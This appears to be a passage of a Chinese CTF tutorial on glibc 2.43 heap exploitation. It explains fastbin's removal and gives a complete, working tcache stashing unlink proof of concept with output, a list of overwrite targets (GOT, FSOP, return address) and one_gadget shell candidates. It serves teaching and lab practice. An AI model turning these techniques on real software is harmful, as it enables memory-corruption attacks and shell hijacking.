gcc -O0 -g -fno-pie -no-pie fastbin.c -o fastbin
./fastbin pure 1
```

输出：

```text
a = 0x11479080  b = 0x114790f0
free(): double free detected in tcache 2
```

三次 free 的第三次当场终止——2.43 的 tcache key 检测（[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存|P12 3.1]]）在 free 流程的第 3 步，==排在一切去向判断之前==：块连去哪都没决定，先被查出是重复释放。绕过它有两条正路：用 UAF 编辑原语把 key 改成别的值再 free（同块进链两次，[[P13-基础堆漏洞|P13]] 的 double free 一节）；或把该档装满让 free 换道（本章第 7 节的 stashing 就建在换道上）。

## 6. fastbin 为什么被移除

glibc 2.41–2.43 的 malloc 重写把 fastbin 拆掉了，原因可以归成三层：

- **性能价值消失**。fastbin 诞生的目的是给小块分配提一条免合并、免检查的快路。tcache 每档扩到 16（2.43）之后，==同尺寸小块的缓存需求被 tcache 一档全覆盖==，fastbin 夹在 tcache 与 smallbin 之间再没有分到活。
- **第二级缓存的职责有人接了**。2.41 起，小块 free 在 tcache 满后==直接进对应 smallbin==，不再经过 fastbin，也不再污染 unsorted（[[P12-glibc堆管理机制#3.2 smallbin：精确尺寸的双链|P12 3.2]]）——fastbin 原来承担的"tcache 溢出后的去处"由 smallbin 接管。
- **维护只剩成本**。单链、少检查、成环即重复分配——fastbin 是历史上堆漏洞的重灾区（本章 5.1 的三件套就是清单）。一个既没有性能收益、又持续产生安全债的结构，在重写中被整体移除是自然结局；源码里连 `global_max_fast` 都没有了（[[P12-glibc堆管理机制#3.6 fastbin：已经退场的经典机制|P12 3.6]]）。

对做题的意义：老题解里所有"free 进 fastbin / malloc 查 fastbin / fastbin dup"的步骤，在本机 2.43 上没有对应物——==要么进历史环境复现，要么按第 9 节的表换算成 tcache 时代的等价动作==。

## 7. tcache stashing unlink attack：2.43 上依然成立

### 7.1 机制：批量暂存沿 bk 走

[[P12-glibc堆管理机制#4. malloc 的主干流程|P12 第 4 节]]第 2 步：malloc 在 smallbin 精确命中时，取走一块，==把同档余块批量搬进 tcache==。这个暂存循环每轮做的事是：

```c
tc_victim = last(bin);        /* 从 bin 的 bk 侧取一块            */
bck = tc_victim->bk;          /* 读它的 bk                        */
bin->bk = bck;                /* 摘链                             */
bck->fd = bin;                /* 回写：向 bck 的 mem 处写 bin 地址 */
tcache_put(tc_victim, tc_idx);
```

==循环对 bk 不做双向一致性检查==——[[P12-glibc堆管理机制#6.1 后向合并：PREV_INUSE 为 0 时吃掉前块|P12 6.1]] 里 unlink 那道"邻居必须互相指回来"的检查不在这里。于是：把将被暂存的块的 bk 改成伪造块地址，循环会顺着这个假 bk 继续——伪造块被当作"下一块"登记进 bin、再被塞进 tcache，下次 malloc 返回它；同时 `bck->fd = bin` 还向伪造块的 mem 处写入一个 libc 地址。

### 7.2 布局与条件

一张清单，全部来自循环的运行条件：

- **触发时该档 tcache 必须为空**——否则 malloc 第 1 步直接从 tcache 返回，根本走不到 smallbin。装满（16 个）再清空，把目标两块留进 smallbin。
- **smallbin 里要有余块**（≥ 2）：一块被精确命中返回，其余进暂存循环。
- **将被暂存的那块可被 UAF 编辑 bk**。
- **伪造块 0x10 对齐**，且==伪造块的 bk 必须指回真正的链表头==（libc 里的 main_arena 地址）——循环取到伪造块后还要读它的 bk 来收尾，指错地方循环就出不去了。链表头的地址不用查符号表：==在链上的块，fd 槽存的就是它==（顺带完成 libc 泄露）。
- **进 smallbin 的两块不能地址相邻**——tcache 满后的 free 走合并路径（[[P12-glibc堆管理机制#5. free 的主干流程|P12 第 5 节]]的 warning），相邻空闲块会被并成一块。布局时用不相邻的编号，或中间垫在用块。

### 7.3 完整演示

```c
/* stashing.c —— tcache stashing unlink attack（x86-64 Linux，glibc 2.43）
 * smallbin 精确命中后"余块批量暂存进 tcache"的一步会沿 bk 走链：
 * 把暂存块的 bk 改成伪造块，伪造块就被塞进 tcache，下次 malloc 拿到它。
 * 布局要点：两个目标进 smallbin 前先装满 tcache（2.43 每档 16 个），
 * 且两块不能相邻——合并路径的 free 会把相邻空闲块并起来。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static char fake[0x80] __attribute__((aligned(0x10)));   /* 伪造块：fake 即 chunk 地址 */
static void *sink[16];                                   /* 承接 malloc 返回值，块保持分配 */
void *slots[20];

int main(void) {
    setbuf(stdout, NULL);

    /* 1. 布局：18 个 0x68 + 垫块 */
    for (int i = 0; i < 18; i++) slots[i] = malloc(0x68);
    slots[18] = malloc(0x28);            /* 垫块：隔开 top */
    printf("mem[15] = %p  mem[16] = %p  mem[17] = %p\n", slots[15], slots[16], slots[17]);

    /* 2. free：前 16 个装满 tcache；第 17、18 个（15、17 号块，互不相邻）进 smallbin */
    int order[18] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,16,15,17};
    for (int i = 0; i < 18; i++) free(slots[order[i]]);

    /* 3. 清空 tcache（16 次），smallbin[0x70] 里剩下 15、17 两块 */
    for (int i = 0; i < 16; i++) sink[i] = malloc(0x68);

    unsigned long *s15 = (unsigned long *)slots[15];   /* 悬垂指针：UAF 读写 */
    unsigned long *s17 = (unsigned long *)slots[17];
    printf("free 后：s15(mem) = %p：fd=%#lx bk=%#lx\n", slots[15], s15[0], s15[1]);
    printf("        s17(mem) = %p：fd=%#lx bk=%#lx\n", slots[17], s17[0], s17[1]);

    unsigned long bin_head = s15[0];     /* 在链上的块 fd 指向 libc 里的 smallbin 头 */
    printf("smallbin 链表头 @ %#lx（顺带拿到 libc 地址）\n", bin_head);

    /* 4. 伪造块：bk 指回链表头，遍历取到 fake 后能正常收尾 */
    unsigned long *fk = (unsigned long *)fake;
    fk[3] = bin_head;                    /* fake->bk = bin_head */
    printf("fake chunk @ %p，fake->bk = %#lx\n", fake, fk[3]);

    /* 5. 篡改将被暂存的块的 bk 指向 fake */
    s17[1] = (unsigned long)fake;
    printf("s17 的 bk 已改为 %#lx\n", s17[1]);

    /* 6. 触发：精确命中 smallbin，返回一块，余块沿 bk 暂存进 tcache */
    void *v = malloc(0x68);
    printf("触发 malloc = %p（应返回 mem[15]）\n", v);
    printf("fake->fd = %#lx（暂存循环先写入 bin 头地址，tcache_put 又把它覆盖成加密 next）\n", fk[2]);

    /* 7. tcache 里现在有 fake：连取两次 */
    void *t1 = malloc(0x68);
    void *t2 = malloc(0x68);
    printf("第 2 次 malloc = %p\n", t1);
    printf("第 3 次 malloc = %p\n", t2);
    if (t1 == fake + 0x10 || t2 == fake + 0x10) {
        strcpy(t1 == fake + 0x10 ? t1 : t2, "STASHING PWNED");
        printf("目标块到手，写入读回：%s\n", fake + 0x10);
    }
    return 0;
}
```

输出（本机 glibc 2.43）：

```text
mem[15] = 0x290636a0  mem[16] = 0x29063710  mem[17] = 0x29063780
free 后：s15(mem) = 0x290636a0：fd=0x71eabf012b28 bk=0x29063770
        s17(mem) = 0x29063780：fd=0x29063690 bk=0x71eabf012b28
smallbin 链表头 @ 0x71eabf012b28（顺带拿到 libc 地址）
fake chunk @ 0x404100，fake->bk = 0x71eabf012b28
s17 的 bk 已改为 0x404100
触发 malloc = 0x290636a0（应返回 mem[15]）
fake->fd = 0x29063384（暂存循环先写入 bin 头地址，tcache_put 又把它覆盖成加密 next）
第 2 次 malloc = 0x404110
第 3 次 malloc = 0x29063780
目标块到手，写入读回：STASHING PWNED
```

逐步读：

- 布局后链现场与推导一致：`s15->fd` 是 libc 里的链表头，`s17->bk` 也是它——两块经链表头串成环。==fd 槽这个值就是免费的 libc 泄露==。
- 触发 malloc 精确命中，返回 `mem[15]`；暂存循环先搬 s17（bk 被改成 fake），顺着假 bk 把 fake 也登记进来、塞进 tcache。
- tcache 是 LIFO：fake 后进先出，第 2 次 malloc 直接返回 `fake + 0x10`，第 3 次返回 s17。==任意地址分配到手==。
- `fake->fd` 那行是两个写入叠在同一格的痕迹：暂存循环先按 `bck->fd = bin` 写入链表头地址（这一步是 stashing 附赠的"向任意地址写 libc 指针"），随后 `tcache_put(fake)` 又把它覆盖成加密的 next。

### 7.4 一个值得记的坑：链表头认错之后

> [!info]- fake->bk 指错地方的崩法（调试过程复盘）
> 上面 7.2 的条件里最不起眼的是"伪造块的 bk 指回==真正的==链表头"。这个演示的初版把链表头认成了 `s15->bk`——那其实是 s17 的 chunk 地址（s15 与 s17 经链表头串成环，s15 的 bk 是环上的下一块）；真正的链表头在 `s15->fd` 里。指错之后程序在触发 malloc 时崩溃，GDB 抓到的现场：
>
> ```text
> Program received signal SIGSEGV, Segmentation fault.
> 0x00007ffff7cb2723 in _int_malloc (av=0x7ffff7e12ac0 <main_arena>, bytes=104)
>     at ./malloc/malloc.c:3886
> rax            0x405770       ← 循环正在遍历的块（s17 的 chunk）
> rdi            0x55b25705f80b9e67 ← 读出来的 bk：一个 64 位随机数
> ```
>
> 崩溃链条值得完整走一遍：暂存循环从 fake 出发（fake->bk 指向 s17 的 chunk）→ 把 s17 的 chunk 当作"下一块"塞进 tcache → 绕回来到 s17 的 chunk，读它的 `+0x18` 当 bk——==而这 8 字节在它进 tcache 时已被 `tcache_put` 写成了随机的 key==（[[P12-glibc堆管理机制#3.1 tcache：第一优先的线程缓存|P12 3.1]]）→ 循环拿着随机数当地址做 `bck->fd = bin` 的写入 → 段错误。
>
> 两个教训：一是 ==fake->bk 必须等于真链表头==，让循环在取完 fake 后看到"下一块 == bin"而正常收尾；二是 ==tcache 的 key 会污染悬垂块的第 9–16 字节==——布局时凡是"还要按 bk/bk 位读"的块，进过 tcache 就要重新确认那格的内容。

## 8. 拿到任意地址之后写哪里

tcache poisoning 和 stashing 的产出是同一个：一次"分配在指定地址"。2.43 时代这一击打向哪里，按可用性与成本列表：

| 落点 | 需要的准备 | 说明 |
| ---- | ---- | ---- |
| `__free_hook` / `__malloc_hook` | —— | ==2.34 起符号已不存在==，一切"改 hook 拿一次任意写"的题解作废（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]） |
| 栈上的返回地址 | 栈地址泄露（格式化字符串等，[[P09-格式化字符串漏洞\|P9]]） | 分配到返回地址附近，一次 edit 覆盖或铺 ROP 链（[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]）；栈地址泄露常由格式化字符串漏洞单独提供 |
| `_IO_list_all` 与伪造 FILE 结构 | libc 基址 | 把伪造的 IO_FILE 挂进标准库的文件结构链，在打印或退出时劫持控制流——FSOP 主线，[[P16-FSOP与HouseofApple2\|P16]] 整章展开 |
| exit handler 结构（`__exit_funcs`） | libc 基址 | 正常退出时逐个调用的函数表；表内指针经过加密处理，伪造时需配套处理加密，细节同样放 [[P16-FSOP与HouseofApple2\|P16]] |
| partial RELRO 的 GOT | 视目标而定 | 把 `system` 写进 `free@got`、`puts@got` 一类条目，下一次调用即转向——[[P11-Canary绕过与GOT攻击\|P11]] 的思路原样平移到堆上；Full RELRO 下 GOT 只读，先查 checksec |

> [!note] 选落点的三个通用检查
> ① 地址 0x10 对齐（tcache 取出的对齐检查）；② 目标及其后 16 字节可写（弹出时的 next 读取与 key 清零都会碰它）；③ 写完之后==有谁会来用这个地址==——函数指针等调用、GOT 等下次链接、FILE 等下次 IO。没有触发者的写入只是改了内存。

> [!info]- one_gadget：落点只需写一个地址时的捷径
> 落点若是个会被直接调用的函数指针（如本章的 `fp`），写 `system` 需要同时安排参数；one_gadget 找"一条指令序列直接 execve("/bin/sh")"的候选，用法见 [[P07-ret2libc-ret2syscall-ret2shellcode#4. one_gadget：一个地址的捷径|P7 第 4 节]]。对本机 2.43 的 libc 跑一遍（寄存器约束按 System V AMD64 ABI 的调用现场对照）：
>
> 输出：
>
> ```text
> 0xf84a3 execve("/bin/sh", rbp-0x50, r15)
> constraints:
>   address rbp-0x50 is writable
>   r14 == NULL || {"/bin/sh", r14, NULL} is a valid argv
>   [r15] == NULL || r15 == NULL || r15 is a valid envp
>
> 0x11d3c5 posix_spawn(rsp+0x74, "/bin/sh", [rsp+0x48], 0, rsp+0x80, environ)
> constraints:
>   rax == 0x0
>   [rsp+0x80] == NULL || {[rsp+0x80], [rsp+0x88], [rsp+0x90], [rsp+0x98], ...} is a valid argv
>   [rsp+0x48] == NULL || (s32)[[rsp+0x48]+0x4] <= 0x0
> ```
>
> 每个候选附带的 constraints 就是"触发点现场必须满足的条件"，逐条与 GDB 里的寄存器对照后选用；满足不了的候选写了也是崩溃。

## 9. 各技术的版本适用表

| 技术 / 行为 | 2.27 | 2.31 | 2.34 | 2.41 | 2.42 | 2.43 |
| ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| tcache 每档上限 | 7 | 7 | 7 | 7 | 7 | ==16== |
| 每档计数语义 | counts（已用数，0 递增） | 同左 | 同左 | 同左 | ==num_slots==（剩余容量，16 递减） | num_slots |
| tcache key（double-free 检测） | 无——同块可直接二次 free | 有，key 值 = tcache 结构地址（可从堆上读到） | 有，key 换==随机值==（2.34 起） | 有（随机） | 有（随机） | 有（随机） |
| safe-linking（fd 加密） | 无 | 无 | ==有==（2.32 起） | 有 | 有 | 有 |
| `__malloc_hook` / `__free_hook` | 有 | 有 | ==移除== | 无 | 无 | 无 |
| fastbin | 有 | 有 | 有 | 有 | 有 | ==移除== |
| tcache 结构分配时机 | 首次 malloc（堆上第一块） | 同左 | 同左 | 同左 | 同左 | ==首次 free== |
| 小块 free 满档后去向 | unsorted | unsorted | unsorted | ==直接进 smallbin== | smallbin | smallbin |
| tcache poisoning 可用性 | 可用（无加密无对齐检查） | 可用（同左） | 可用，需加解密（式 14.1） | 同左 | 同左，注意 num_slots | ==主线==（16 档、结构推迟分配） |
| fastbin dup（A-B-A） | 可用 | 可用（tcache 满档后） | 同左 | 同左 | 同左 | ==不可用==（fastbin 已移除） |
| tcache stashing unlink | 可用 | 可用 | 可用 | 可用 | 可用 | ==可用==（7.3 的现场） |

> [!note] 读老题解的换算法
> "free 7 个装满 tcache" → 本机改 16 个；"counts 数组" → `num_slots`，计数方向相反；"tcache 结构是堆上第一块，偏移 0x10 打 counts" → 结构位置不固定，先定位；"2.29–2.33 靠预测 key 绕 double-free" → 本机 key 是随机值，改走改 key 或换道路线；"第 8 个 free 进 fastbin" → 本机第 17 个 free 直进 smallbin；"写 `__free_hook`" → 换第 8 节的落点表。差异不改变攻击思路的骨架，只改变布点与步长。

## 10. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| show 读出的 fd 是个"不像地址的小数" | 不是坏了：那是 safe-linking 的空链形状，值本身就是堆页号（3.2） |
| 解密还原的结果不对 | 异或量用错：要异或的是==存这个值的槽自己的地址 >> 12==，不是链上另一块的地址；同页内两者右移 12 位相同，跨页就露馅 |
| 伪造 fd 后第二次 malloc 拿回来的地址差 0x10 | 链的类型搞反了：tcache 存 mem 地址，fastbin 的 fd 存 chunk 地址（5.4） |
| malloc 返回前报 `malloc(): unaligned tcache chunk detected` | 目标地址没对齐 0x10；换个对齐的落点，或从对齐的地址偏移进目标（3.4 的 warning） |
| 伪造 fd 写了，分配却没落到目标 | 加密漏了或公式反了：写入值 = 目标 ^ (存储位置 >> 12)， plaintext 直写等于写了个错地址（3.4）；用 `tcacheview` 看链的解密结果定位 |
| A-B-A 在 2.43 第三次 free 直接 Aborted | tcache key 检测，排在一切去向判断之前（5.5）；UAF 改 key（[[P13-基础堆漏洞\|P13]]）或装满换道（第 7 节） |
| 按老题解 free 7 个却看不到档满 | 2.43 每档上限 16（[[P12-glibc堆管理机制#9. glibc 2.43 行为注记\|P12 第 9 节]]） |
| stashing 触发后程序在 malloc 里崩、bk 是随机数 | fake->bk 没指回真正的链表头，遍历绕回 tcache 块把 key 当了 bk（7.4 的复盘）；链表头从在链块的 fd 槽读 |
| stashing 的两个目标块 free 后变成一块 | 满档后的 free 走合并路径，相邻空闲块会被并掉（7.2）；布局错开编号或垫在用块 |
| 想在本机复现 fastbin 题解 | 2.43 没有 fastbin；进 5.2 的历史环境，或按第 9 节的表换算 |
| patchelf 换老 libc 后报 `version 'GLIBC_2.34' not found` | 宿主新工具链编译的二进制按新符号版本引用 libc；老环境直接在老容器里编译运行（5.2），patchelf 路线适合老工具链编译的题目附件 |
| 泄露的 libc 地址每次都对不上符号偏移 | 泄露的是"某个 bin 的链表头"，不同 bin 的头偏移不同（[[P12-glibc堆管理机制#3. bins：释放后的 chunk 都去哪里\|P12 第 3 节]]）；算基址前确认用的是哪个头 |

## 11. 配套练习与延伸阅读

> [!note] 实战任务：三道覆盖 safe-linking 的 tcache 题
> 按 [[P01-PWN导论与缓解机制全景#2. 利用链构建的五步流程\|P1 第 2 节]]的五步流程打完整链，每道题都走到 getshell 或读 flag：
> ① 在 BUUCTF 或 NSSCTF 上按标签搜 tcache / safe-linking，挑两道题目环境标注 glibc 2.32–2.35 的菜单堆题（有 UAF 或 off-by-one 的先做）——这个区间的题和本章主线几乎一致，差别只在每档上限还是 7、结构还是首块分配；
> ② 把 how2heap 仓库里 tcache poisoning 与 tcache stashing 的示例在 2.43 上重写一遍——老示例的步距全部要按第 9 节的表换算，换算本身就是练习；
> ③ 给本章的 `p14_uaf.c` 做减法自测：删掉 `mem = %p` 的打印（逼你只用 show 泄露）、把 0x68 换成 0x1f8（逼你过 smallbin）、打开全保护（逼你处理 PIE 下的落点计算）——每减一项，exploit 要补一段什么，写下来。
> 三道全部按"泄露 → 解密 → 伪造 → 两次分配 → 落点决策（第 8 节）"的顺序推进，卡住的每一步回到对应小节。

延伸阅读按用途分三档：

- **源码**：glibc 的 `malloc/malloc.c`——式 14.1 的 `PROTECT_PTR`/`REVEAL_PTR`、tcache 的进出、smallbin 暂存循环全在这一个文件里；第 7 节的循环逻辑以 2.43 的源码为准。
- **社区仓库**：shellphish 的 how2heap（GitHub）按攻击技术组织最小示例，多数基于旧版 glibc，配合第 9 节的表换算使用。
- **后续章节**：House 系列与 largebin 上的进一步攻击 → [[P15-House系列攻击技术|P15]]；任意地址分配之后打 IO_FILE 的完整路线 → [[P16-FSOP与HouseofApple2|P16]]；把本章的布局账本当成通用解题工具 → [[P17-堆风水与通用利用思路|P17]]；GDB 插件（pwndbg 的 `vis_heap_chunks`、`tcache` 命令）与本章自写脚本的对照 → [[P05-pwntools与GDB插件工具链|P5]]。
